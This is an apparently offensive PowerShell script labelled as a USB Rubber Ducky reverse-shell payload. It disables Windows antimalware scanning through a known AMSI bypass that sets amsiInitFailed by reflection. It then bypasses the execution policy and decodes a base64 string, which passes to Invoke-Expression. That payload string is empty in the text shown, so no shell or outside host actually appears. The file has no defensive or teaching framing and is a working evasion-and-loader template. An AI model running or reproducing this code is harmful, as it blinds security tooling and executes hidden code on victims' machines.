# powershell_ducky_payload.ps1
# Reverse shell with ducky delivery

# Base64 encoded reverse shell
$payload = ""

# AMSI bypass
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Execution policy bypass
Set-ExecutionPolicy Bypass -Scope Process -Force

# Decode and execute
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($payload))
Invoke-Expression $decoded
